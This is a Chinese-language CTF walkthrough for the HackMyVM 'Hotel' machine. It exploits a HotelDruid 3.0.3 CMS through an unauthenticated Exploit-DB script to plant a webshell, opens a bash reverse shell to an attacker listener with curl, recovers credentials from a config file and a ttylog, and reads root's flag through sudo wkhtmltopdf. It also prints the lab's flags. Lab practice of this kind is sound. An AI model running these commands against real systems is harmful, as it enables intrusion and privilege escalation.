# Hotel

2025.02.14 https://hackmyvm.eu/machines/machine.php?vm=Hotel

[video](https://www.bilibili.com/video/BV1P6KKeaELE/?spm_id_from=333.1387.homepage.video_card.click&vd_source=aed2f374c732513d2e535afafb1fd2ec)

## Ip

192.168.5.40

## Scan

```
PORT   STATE SERVICE
22/tcp open  ssh
80/tcp open  http
```

访问 80 web 底部显示的是 HotelDruid 是一个 CMS，访问 http://192.168.5.40/doc/README.english 发现了系统的版本 HotelDruid version 3.0.3， 看看有没有可以直接利用的漏洞，发现可能有 RCE 命令注入，https://www.exploit-db.com/exploits/50754 下载 exp py 文件， 可以直接访问到 dashboard，不需要认证信息：

```
python3 50754.py -t http://192.168.5.40 --noauth

[*] Trying to access the Dashboard.
[*] Checking the privilege of the user.
[+] User has the privilege to add room.
[*] Adding a new room.
[+] Room has been added successfully.
[*] Testing code exection
[+] Code executed successfully, Go to http://192.168.5.40/dati/selectappartamenti.php and execute the code with the parameter 'cmd'.
[+] Example : http://192.168.5.40/dati/selectappartamenti.php?cmd=id
[+] Example Output : uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

已经写入了 webshell，直接 kali 建立监听，获得反弹 shell：

```
nc -lvnp 8888

curl -G --data-urlencode 'cmd=/bin/bash -c "/bin/bash -i >& /dev/tcp/192.168.5.3/8888 0>&1"' http://192.168.5.40/dati/selectappartamenti.php
```

获得了反弹的 shell，发现一个用户 person 但是没有权限读取 user.txt，先找到了数据库配置连接文件：

```
www-data@hotel:~/html/hoteldruid$ cat /var/www/html/hoteldruid/dati/dati_connessione.php
<?php
$PHPR_DB_TYPE = "mysqli";
$PHPR_DB_NAME = "hotel";
$PHPR_DB_HOST = "localhost";
$PHPR_DB_PORT = "3306";
$PHPR_DB_USER = "adminh";
$PHPR_DB_PASS = "adminp";
$PHPR_LOAD_EXT = "";
$PHPR_TAB_PRE = "";
$PHPR_LOG = "NO";
```

但是上面的密码不是 person 用户的密码，继续寻找，发现 ttylog 文件,尝试读取，发现了 person 用户的密码：

```
www-data@hotel:~/html$ /usr/bin/ttyplay ttylog
person@hotel:~$ my passw0rd is Endur4nc3. enjoy it!
```

使用密码 Endur4nc3. 切换到 person 用户，得到了 user flag:

```
person@hotel:~$ cat user.txt
RUvSNcQ3m2OyHzxHMV
```

sudo -l 发现: (root) NOPASSWD: /usr/bin/wkhtmltopdf 不是 GTFOBin 中的，看看它的帮助信息，将文件转化成 pdf，所以直接可以读取 root flag：

```
sudo wkhtmltopdf /root/root.txt flag.pdf
```

读取 flag.pdf 中的内容得到了 root flag：

```
7MUnADgp3g4STEPHMV
```
